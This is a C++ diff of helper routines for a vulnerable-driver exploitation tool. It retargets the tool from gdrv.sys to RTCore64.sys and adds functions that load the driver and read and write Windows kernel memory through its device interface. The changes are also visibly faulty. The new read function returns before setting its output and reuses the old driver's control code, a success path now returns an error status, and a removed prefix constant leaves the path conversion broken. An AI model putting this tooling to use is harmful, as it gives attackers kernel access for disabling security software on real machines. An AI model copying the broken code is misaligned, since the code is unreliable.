@@ -92,6 +92,27 @@ NTSTATUS helpers::read_knrl_mem( HANDLE DeviceHandle, ULONG64 target, DWORD64& o
         &IoStatusBlock, IOCTL_GIO_MEMCPY, &MemcpyInput, sizeof( MemcpyInput ), nullptr, 0 );
 }
 
+BOOL helpers::RTCoreReadMemory( HANDLE DeviceHandle, ULONG_PTR Address, DWORD ValueSize, DWORD64 &Value ) {
+    
+    RTC64_MEMORY_STRUCT memory_read{};
+    IO_STATUS_BLOCK IoStatusBlock{};
+    // initialize the structure to all zeroes
+    ZeroMemory( &memory_read, sizeof( memory_read ) );
+    ZeroMemory( &IoStatusBlock, sizeof( IoStatusBlock ) );
+
+    memory_read.Address = Address;
+    memory_read.Size = ValueSize;
+
+    return NtDeviceIoControlFile( DeviceHandle, nullptr, nullptr, nullptr,
+        &IoStatusBlock, IOCTL_GIO_MEMCPY, &memory_read, sizeof( memory_read ), nullptr, 0 );
+
+    Value = memory_read.Value;
+
+    return TRUE;
+}
+
+
+
 NTSTATUS helpers::write_krnl_mem( HANDLE DeviceHandle, ULONG64 target, DWORD64 value ) {
     GIOMemcpyInput MemcpyInput{};
     IO_STATUS_BLOCK IoStatusBlock{};
@@ -108,40 +129,44 @@ NTSTATUS helpers::write_krnl_mem( HANDLE DeviceHandle, ULONG64 target, DWORD64 v
 NTSTATUS helpers::EnsureDeviceHandle( HANDLE* outHandle, PWSTR LoaderServiceName ) {
     *outHandle = nullptr;
 
-    // Try to open first (driver might already be loaded)
-    NTSTATUS stat = helpers::OpenDeviceHandle( outHandle, FALSE );
+    NTSTATUS stat{ STATUS_SUCCESS };
 
-    if ( NT_SUCCESS( stat ) && *outHandle ) {
-        wprintf( L"[*] Device handle opened successfully (preloaded): %p\n", *outHandle );
-        return stat;
-    }
+    // Try to open first (driver might already be loaded)
+    stat = helpers::OpenDeviceHandle( outHandle, FALSE );
+    if ( NT_SUCCESS( stat ) && *outHandle ) return{ STATUS_INVALID_HANDLE };
 
     // Try to load the driver
     stat = helpers::LoadDriver( LoaderServiceName );
-    if ( !NT_SUCCESS( stat ) ) return stat;
+    if ( !NT_SUCCESS( stat ) ) return{ STATUS_INVALID_HANDLE };
 
-    wprintf( L"[+] Vuln (gdrv.sys) loaded successfully\n" );
+    wprintf( L"[+] Vuln (RTCore64.sys) loaded successfully\n" );
 
-    std::this_thread::sleep_for( std::chrono::milliseconds( 200 ) );
+    std::this_thread::sleep_for( std::chrono::milliseconds( 1500 ) );
 
     // Try to open device again after loading
     stat = helpers::OpenDeviceHandle( outHandle, 0 );
-    if ( !NT_SUCCESS( stat ) || !*outHandle ) return stat;
+    if ( !NT_SUCCESS( stat ) || !*outHandle ) return{ STATUS_INVALID_HANDLE };
 
     wprintf( L"[*] Device handle opened successfully: %p\n", *outHandle );
     return stat;
 }
 
+/* 
+* rdx,              NT_Object_Manager_namespace ; "\\Device\\RTCore64" 
+* lea               rcx, [rsp+78h+DestinationString] ; DestinationString
+* call              cs:RtlInitUnicodeString
+* lea               rdx, symbolic_link ; "\\DosDevices\\RTCore64"
+* lea               rcx, [rsp+78h+SymbolicLinkName] ; DestinationString
+*/
+
 NTSTATUS helpers::OpenDeviceHandle( PHANDLE DeviceHandle, BOOLEAN PrintErrors )
 {
-    UNICODE_STRING devName = RTL_CONSTANT_STRING( L"\\Device\\GIO" );
+    UNICODE_STRING devName = RTL_CONSTANT_STRING( L"\\Device\\RTCore64" ); 
     OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES( &devName, OBJ_CASE_INSENSITIVE );
     IO_STATUS_BLOCK IoStatusBlock{};
 
     const NTSTATUS stat = NtCreateFile( DeviceHandle, SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, nullptr,
         FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, nullptr, 0 );
-
-    if ( !NT_SUCCESS( stat ) && PrintErrors ) return stat;
 
     return stat;
 }
@@ -166,10 +191,10 @@ NTSTATUS helpers::CreateDriverService( PWCHAR ServiceName, PWCHAR FileName )
     return Status;
 }
 
+
 int helpers::ConvertToNtPath( PWCHAR Dst, PWCHAR Src ) {
     if ( !Dst || !Src ) return 0;
 
-    constexpr const wchar_t* NtPrefix = { L"\\??\\" };
     constexpr size_t PrefixLen = 4;
 
     size_t srcLen = wcslen( Src );
@@ -188,15 +213,13 @@ int helpers::ConvertToNtPath( PWCHAR Dst, PWCHAR Src ) {
     return static_cast< int >( ( totalLen + 1 ) * sizeof( wchar_t ) );
 }
 
-NTSTATUS helpers::LoadDriver( PWCHAR ServiceName )
-{
+NTSTATUS helpers::LoadDriver( PWCHAR ServiceName ){
     UNICODE_STRING ServiceNameUcs;
     RtlInitUnicodeString( &ServiceNameUcs, ServiceName );
     return NtLoadDriver( &ServiceNameUcs );
 }
 
-NTSTATUS helpers::UnloadDriver( PWCHAR ServiceName )
-{
+NTSTATUS helpers::UnloadDriver( PWCHAR ServiceName ){
     UNICODE_STRING ServiceNameUcs;
     RtlInitUnicodeString( &ServiceNameUcs, ServiceName );
     return NtUnloadDriver( &ServiceNameUcs );
